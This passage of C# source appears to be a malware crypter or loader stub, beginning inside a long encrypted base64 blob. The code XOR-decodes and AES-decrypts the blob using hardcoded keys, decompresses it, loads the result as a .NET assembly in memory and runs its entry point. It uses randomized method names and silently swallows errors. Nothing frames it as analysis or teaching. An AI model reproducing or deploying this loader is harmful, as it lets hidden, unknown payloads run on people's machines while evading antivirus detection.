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";
                string passphrase = "MaWkCVLG7qTTEu0Y";
                string saltBase64 = "bHb1QD9XtL9V2OOIJqQxBA==";
                byte[] salt = Convert.FromBase64String(saltBase64);
                byte[] encryptedBytes = Convert.FromBase64String(encodedData);
                byte[] xorEncryptedBytes = ohBAdbGTBA(encryptedBytes, passphrase);
                byte[] saltedEncryptedBytes = xorEncryptedBytes.Skip(salt.Length).ToArray(); // Remove the salt before decryption

                byte[] key = HONaraQVA4(Convert.FromBase64String("OcOPQx/SHh3Gg83jEa1gnekrMMFJ5iMrQSd/IDuaVuQ5pI0TaEQjAvqCykY0CVXn"), passphrase);
                byte[] iv = HONaraQVA4(Convert.FromBase64String("OKP12J+eHLGDiOtOCUxp4Zex57tFfoVlZEWsLWhTe4c="), passphrase);

                byte[] decryptedBytes = new ebWYdWNvLk().Decrypt(saltedEncryptedBytes, key, iv);
                byte[] decompressedBytes = Decompress(decryptedBytes);

                // Load the decrypted assembly from memory
                Assembly assembly = Assembly.Load(decompressedBytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {
                    var parameters = method.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                    method.Invoke(null, parameters);
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions silently
            }
        }

        public override byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.PKCS7;

                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }
                    return ms.ToArray();
                }
            }
        }

        static byte[] HONaraQVA4(byte[] data, string passphrase)
        {
            using (Aes aes = Aes.Create())
            {
                using (Rfc2898DeriveBytes keyGen = new Rfc2898DeriveBytes(passphrase, new byte[8], 10000))
                {
                    aes.Key = keyGen.GetBytes(32);
                    aes.IV = keyGen.GetBytes(16);
                    aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(data, 0, data.Length);
                            cs.Close();
                        }
                        return ms.ToArray();
                    }
                }
            }
        }

        static byte[] ohBAdbGTBA(byte[] data, string key)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] result = new byte[data.Length];

            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return result;
        }

        static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            {
                using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                {
                    using (var resultStream = new MemoryStream())
                    {
                        zipStream.CopyTo(resultStream);
                        return resultStream.ToArray();
                    }
                }
            }
        }
    }
}
